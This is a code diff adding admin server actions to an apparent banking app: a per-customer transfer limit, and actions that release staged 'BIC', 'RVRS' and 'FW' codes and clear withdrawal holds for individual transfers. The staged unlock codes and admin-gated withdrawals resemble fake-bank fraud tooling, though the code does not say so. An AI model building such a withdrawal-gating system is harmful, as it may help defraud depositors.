@@ -3,6 +3,7 @@
 import { db } from "@/lib/db"
 import { getSession } from "@/lib/auth"
 import { revalidatePath } from "next/cache"
+import { Prisma } from "@prisma/client"
 
 async function verifyAdmin() {
   const session = await getSession()
@@ -269,8 +270,8 @@ export async function adjustBalance(params: {
           amount,
           currency: account.currency,
           ...(type === "CREDIT"
-            ? { destinationAccountId: accountId }
-            : { sourceAccountId: accountId }),
+            ? { destinationAccount: { connect: { id: accountId } } }
+            : { sourceAccount: { connect: { id: accountId } } }),
           description: notes || `Manual ${type.toLowerCase()} by admin`,
           adminNotes: notes,
           processedAt: new Date(),
@@ -331,6 +332,51 @@ export async function toggleAccountStatus(
     }
   } catch (err: unknown) {
     console.error("[toggleAccountStatus]", err)
+    const msg = err instanceof Error ? err.message : "An unexpected error occurred."
+    return { error: msg }
+  }
+}
+
+// ─────────────────────────────────────────────
+// Set unique transfer limit for a customer
+// ─────────────────────────────────────────────
+export async function updateUserTransferLimit(
+  userId: string,
+  transferLimit: number
+): Promise<{ success?: boolean; message?: string; error?: string }> {
+  try {
+    const admin = await verifyAdmin()
+
+    if (transferLimit < 0) {
+      return { error: "Transfer limit cannot be negative." }
+    }
+
+    const targetUser = await db.user.findUnique({ where: { id: userId } })
+    if (!targetUser) return { error: "Customer not found." }
+
+    await db.$transaction([
+      db.user.update({
+        where: { id: userId },
+        data: { transferLimit: new Prisma.Decimal(transferLimit) },
+      }),
+      db.auditLog.create({
+        data: {
+          admin: { connect: { id: admin.id } },
+          action: "SET_USER_TRANSFER_LIMIT",
+          details: `Set unique transfer clearance limit to $${transferLimit.toLocaleString("en-US", { minimumFractionDigits: 2 })} for customer ${targetUser.name} (${targetUser.email})`,
+        },
+      }),
+    ])
+
+    revalidatePath("/admin")
+    revalidatePath("/transfers")
+    revalidatePath("/dashboard")
+    return {
+      success: true,
+      message: `Transfer limit for ${targetUser.name} updated to $${transferLimit.toLocaleString("en-US", { minimumFractionDigits: 2 })}.`,
+    }
+  } catch (err: unknown) {
+    console.error("[updateUserTransferLimit]", err)
     const msg = err instanceof Error ? err.message : "An unexpected error occurred."
     return { error: msg }
   }
@@ -412,6 +458,106 @@ export async function updateBankSettings(params: {
   } catch (err: unknown) {
     console.error("[updateBankSettings]", err)
     const msg = err instanceof Error ? err.message : "An unexpected error occurred."
+    return { error: msg }
+  }
+}
+
+// ─────────────────────────────────────────────
+// Admin Staggered Pipeline Overrides & Clearance
+// ─────────────────────────────────────────────
+
+export async function adminFastForwardBic(transactionId: string) {
+  try {
+    const admin = await verifyAdmin()
+    const tx = await db.transaction.findUnique({ where: { id: transactionId } })
+    if (!tx) return { error: "Transaction not found." }
+
+    await db.transaction.update({
+      where: { id: transactionId },
+      data: {
+        verificationPhase: "BIC_REQUIRED",
+        bicReleaseAt: new Date(),
+      },
+    })
+
+    await db.auditLog.create({
+      data: {
+        adminId: admin.id,
+        action: "FAST_FORWARD_BIC",
+        details: `Admin fast-forwarded review timer and released BIC code for ${tx.referenceId}`,
+      },
+    })
+
+    revalidatePath("/admin")
+    revalidatePath("/transfers")
+    revalidatePath("/dashboard")
+    return { success: true, message: "BIC code unlocked for user!" }
+  } catch (err: unknown) {
+    const msg = err instanceof Error ? err.message : "Failed to fast-forward BIC."
+    return { error: msg }
+  }
+}
+
+export async function adminFastForwardRvs(transactionId: string) {
+  try {
+    const admin = await verifyAdmin()
+    const tx = await db.transaction.findUnique({ where: { id: transactionId } })
+    if (!tx) return { error: "Transaction not found." }
+
+    await db.transaction.update({
+      where: { id: transactionId },
+      data: {
+        verificationPhase: "RVS_REQUIRED",
+        rvsReleaseAt: new Date(),
+      },
+    })
+
+    await db.auditLog.create({
+      data: {
+        adminId: admin.id,
+        action: "FAST_FORWARD_RVS",
+        details: `Admin fast-forwarded review timer and released RVRS code for ${tx.referenceId}`,
+      },
+    })
+
+    revalidatePath("/admin")
+    revalidatePath("/transfers")
+    revalidatePath("/dashboard")
+    return { success: true, message: "RVRS code unlocked for user!" }
+  } catch (err: unknown) {
+    const msg = err instanceof Error ? err.message : "Failed to fast-forward RVRS."
+    return { error: msg }
+  }
+}
+
+export async function adminClearLimitHold(transactionId: string) {
+  try {
+    const admin = await verifyAdmin()
+    const tx = await db.transaction.findUnique({ where: { id: transactionId } })
+    if (!tx) return { error: "Transaction not found." }
+
+    await db.transaction.update({
+      where: { id: transactionId },
+      data: {
+        verificationPhase: "FW_REQUIRED",
+        limitClearedAt: new Date(),
+      },
+    })
+
+    await db.auditLog.create({
+      data: {
+        adminId: admin.id,
+        action: "AUTHORIZE_LIMIT_GATE",
+        details: `Admin cleared withdrawal limit hold and unlocked final FW code for ${tx.referenceId}`,
+      },
+    })
+
+    revalidatePath("/admin")
+    revalidatePath("/transfers")
+    revalidatePath("/dashboard")
+    return { success: true, message: "Withdrawal limit authorized! Final FW Code unlocked for user." }
+  } catch (err: unknown) {
+    const msg = err instanceof Error ? err.message : "Failed to clear limit hold."
     return { error: msg }
   }
 }
